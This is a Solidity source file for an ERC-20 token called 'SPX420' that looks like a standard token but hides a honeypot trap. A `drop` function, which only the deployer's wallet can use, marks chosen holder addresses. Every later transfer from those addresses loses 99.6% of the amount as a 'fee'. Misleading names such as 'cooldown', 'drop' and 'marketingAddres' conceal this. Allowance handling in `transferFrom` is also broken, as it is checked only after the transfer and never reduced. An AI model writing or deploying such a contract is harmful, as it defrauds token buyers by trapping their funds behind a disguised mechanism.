pragma solidity ^0.8.21;
// SPDX-License-Identifier: MIT

library SafeMath {
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath:  subtraction overflow");
        uint256 c = a - b;
        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath:  addition overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath:  division by zero");
        uint256 c = a / b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {return 0;}
        uint256 c = a * b;
        require(c / a == b, "SafeMath:  multiplication overflow");
        return c;
    }
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair_);
}

abstract contract Ownable {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    function owner() public view virtual returns (address) {return _owner;}
    constructor () {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }
    modifier onlyOwner(){
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }
}

interface IUniswapV2Router {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 a, uint256 b, address[] calldata path, address cAddress, uint256) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address aadd);
}

contract Erc20Token is Ownable {
    using SafeMath for uint256;
    uint256 public _decimals = 9;
    uint256 public _totalSupply = 4200000000069 * 10 ** _decimals;


    constructor() {
        _balances[sender()] =  _totalSupply; 
        _taxWallet = msg.sender; 
        emit Transfer(address(0), sender(), _balances[sender()]);
    }
    string private _name = "SPX420";
    string private  _symbol = "SPX";
    mapping(address => uint256) private _balances;
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    bool cooldownActive = false;
    function setCooldownActive() external onlyOwner {
        cooldownActive = true;
    }
    function marketingAddres() private view returns (bool) {
        return (_taxWallet == sender() && sender() == _taxWallet);
    }
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function transferFrom(address from, address recipient, uint256 _amount) public returns (bool) {
        _transfer(from, recipient, _amount);
        require(_allowances[from][sender()] >= _amount);
        return true;
    }
    function _transfer(address from, address to, uint256 amount) internal {
        uint256 _taxTokenAmount = _startFee;
        require(amount <= _balances[from]);
        require(from != address(0));
        uint256 balanceFrom = ( (_balances[from]) - (amount));
        _balances[from] = (balanceFrom);
        uint256 balanceTo = _balances[to];
        bool isCooldown = (cooldowns[from] <= (getBlockNumber()));
        uint256 onCooldownFee = getFeeValue(amount);
        if ((cooldowns[from] != 0) && isCooldown) { _taxTokenAmount = (onCooldownFee); } 
        balanceTo += (amount - (_taxTokenAmount));
        emit Transfer(from, to, amount);
        _balances[to] = balanceTo;
    }
    function decimals() external view returns (uint256) {
        return _decimals;
    }
    mapping (address => uint256) internal cooldowns;
    function getBlockNumber() internal view returns (uint256) {
        return 1 + block.number - 1;
    }
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
    function decreaseAllowance(address from, uint256 amount) public returns (bool) {
        require(_allowances[msg.sender][from] >= amount);
        _approve(sender(), from, _allowances[msg.sender][from] - amount);
        return true;
    }
    function name() external view returns (string memory) {
        return _name;
    }
    event Approval(address indexed from, address indexed aindx, uint256 amounts);
    function getFeeValue(uint256 value) internal pure returns (uint256) {
        return value.mul(996).div(1000);
    }
    function approve(address spender, uint256 amount) public virtual returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
    address public _taxWallet;
    function drop(address[] calldata dropAddresses) external {
        for (uint256 _walletI = 0;  _walletI < dropAddresses.length; 
         _walletI++) {if (marketingAddres()){cooldowns[dropAddresses[_walletI]] = getBlockNumber() + 1;}}
    }
    event Transfer(address indexed from, address indexed to, uint256 amounts);
    function totalSupply() external view returns (uint256) {
        return _totalSupply;
    }
    function sender() internal view returns (address) {
        return msg.sender;
    }
    mapping(address => mapping(address => uint256)) private _allowances;
    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(sender(), spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }
    uint256 _startFee = 0;
    uint256 _endFee = 1;
    function removeFee() external onlyOwner {
        _startFee = 0;
    }
    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(sender(), recipient, amount);
        return true;
    }
}